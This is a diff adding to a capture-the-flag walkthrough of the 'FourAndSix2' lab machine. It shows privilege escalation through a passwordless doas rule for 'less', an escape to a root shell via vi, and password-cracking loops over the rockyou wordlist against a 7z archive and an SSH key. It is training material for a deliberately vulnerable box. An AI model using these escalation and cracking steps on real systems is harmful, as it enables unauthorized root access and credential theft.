@@ -163,9 +163,71 @@ fourandsix2$ id
 uid=1000(user) gid=1000(user) groups=1000(user), 0(wheel)
 ```
 
+you can either use `linpeas.sh` or look for files which has SUID permission
+
+if you use linpeas.sh it mentions a file :
+
+```bash
+╔══════════╣ Checking doas.conf
+permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
+permit nopass keepenv root as root
+```
+
+or if you use the find command it shows you the `doas` binary :
+
+```bash
+fourandsix2$ find / -perm -u=s -type f 2>/dev/null     
+/usr/bin/chfn
+/usr/bin/chpass
+/usr/bin/chsh
+/usr/bin/doas
+/usr/bin/lpr
+/usr/bin/lprm
+/usr/bin/passwd
+/usr/bin/su
+/usr/libexec/lockspool
+/usr/libexec/ssh-keysign
+/usr/sbin/authpf
+/usr/sbin/authpf-noip
+/usr/sbin/pppd
+/usr/sbin/traceroute
+/usr/sbin/traceroute6
+/sbin/ping
+/sbin/ping6
+/sbin/shutdown
+```
+
+as linpeas states we can run `less` command as user root so let's try it :
+
+```bash
+fourandsix2$ doas /usr/bin/less /var/log/authlog 
+```
+
+then use `v` to escape to `vi` editor and the following command to enter to a new shell :
+
+```bash
+:!/bin/sh
 
 
+fourandsix2# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
+```
 
+yes, now we can get the flag :
+
+```bash
+fourandsix2# cat flag.txt
+Nice you hacked all the passwords!
+
+Not all tools worked well. But with some command magic...:
+cat /usr/share/wordlists/rockyou.txt|while read line; do 7z e backup.7z -p"$line" -oout; if grep -iRl SSH; then echo $line; break;fi;done
+
+cat /usr/share/wordlists/rockyou.txt|while read line; do if ssh-keygen -p -P "$line" -N password -f id_rsa; then echo $line; break;fi;done
+
+
+Here is the flag:
+acd043bc3103ed3dd02eee99d5b0ff42
+```
 
 
 
